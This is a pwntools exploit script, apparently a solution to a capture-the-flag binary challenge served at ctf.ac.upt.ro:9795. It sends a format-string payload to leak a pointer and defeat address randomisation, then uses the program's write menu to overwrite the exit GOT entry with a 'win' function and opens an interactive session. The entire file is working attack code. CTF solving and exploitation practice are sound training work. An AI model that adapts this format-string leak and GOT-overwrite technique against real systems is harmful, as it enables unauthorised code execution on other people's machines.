from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./challenge"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("ctf.ac.upt.ro", 9795)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


win = 0x000001380
# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

payload = b"--%28$p--"

ddebug("breakrva 0x00001155\n continue")
io.sendlineafter("name?\n", payload)
io.recvuntil("--")
leak = int(io.recv(14), 16)
log.success("leak :-----> " + hex(leak))
elf.address = leak - 0x31c8

exit_got = elf.got["exit"]
log.success("exit_got :-----> " + hex(exit_got))

win = elf.symbols["win"]
log.success("win :-----> " + hex(win))

io.sendlineafter("> ", "1")
io.sendlineafter("Addr (hex): ", hex(exit_got))
io.sendlineafter("Value (hex, 8 bytes): ", hex(win))
io.sendlineafter("> ", "2")

io.interactive()
